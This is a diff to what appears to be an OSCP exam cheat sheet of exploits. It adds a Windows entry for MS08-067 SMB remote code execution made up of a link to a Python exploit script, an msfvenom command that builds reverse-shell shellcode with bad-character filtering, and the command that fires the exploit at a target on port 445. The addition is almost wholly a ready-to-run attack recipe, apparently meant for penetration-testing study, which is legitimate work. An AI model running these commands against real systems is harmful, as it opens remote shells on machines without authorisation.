@@ -11,7 +11,13 @@ https://github.com/pythonmaster41/Go-For-OSCP/blob/master/Exploits/9545.c #Versi
 
 ## Windows
 
+#### MS08-067 (SMB) - RCE
 
+```
+https://github.com/Agent-Tiro/HackTheBoxScripts/blob/master/Python3-MS08-067.py
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86
+python3 Python3-MS08-067.py <IP> 1 445 #Changer l'OS cible en modifiant le '1'
+```
 
 ## WEB
 
